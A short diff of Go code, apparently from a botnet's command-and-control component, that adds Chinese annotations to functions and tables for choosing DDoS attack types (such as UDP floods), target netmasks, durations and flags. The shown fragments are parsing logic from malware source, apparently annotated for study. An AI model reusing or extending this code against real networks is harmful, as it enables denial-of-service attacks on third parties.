@@ -28,6 +28,8 @@ type FlagInfo struct {
     flagDescription string
 }
 
+
+//攻击flag
 var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
     "len": FlagInfo {
         0,
@@ -132,6 +134,8 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
     },
 }
 
+
+//攻击命令
 var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
     "udp": AttackInfo {
         0,
@@ -194,12 +198,14 @@ func uint8InSlice(a uint8, list []uint8) bool {
     return false
 }
 
+
+//发起一个新攻击
 func NewAttack(str string, admin int) (*Attack, error) {
     atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
     args, _ := shellwords.Parse(str)
 
     var atkInfo AttackInfo
-    // Parse attack name
+    // Parse attack name    解析命令行参数
     if len(args) == 0 {
         return nil, errors.New("Must specify an attack name")
     } else {
@@ -219,7 +225,7 @@ func NewAttack(str string, admin int) (*Attack, error) {
         args = args[1:]
     }
 
-    // Parse targets
+    // Parse targets　　　目标
     if len(args) == 0 {
         return nil, errors.New("Must specify prefix/netmask as targets")
     } else {
@@ -257,7 +263,7 @@ func NewAttack(str string, admin int) (*Attack, error) {
         args = args[1:]
     }
 
-    // Parse attack duration time
+    // Parse attack duration time　　　攻击持续时间
     if len(args) == 0 {
         return nil, errors.New("Must specify an attack duration")
     } else {
@@ -272,7 +278,7 @@ func NewAttack(str string, admin int) (*Attack, error) {
         args = args[1:]
     }
 
-    // Parse flags
+    // Parse flags　　　
     for len(args) > 0 {
         if args[0] == "?" {
             validFlags := "\033[37;1mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
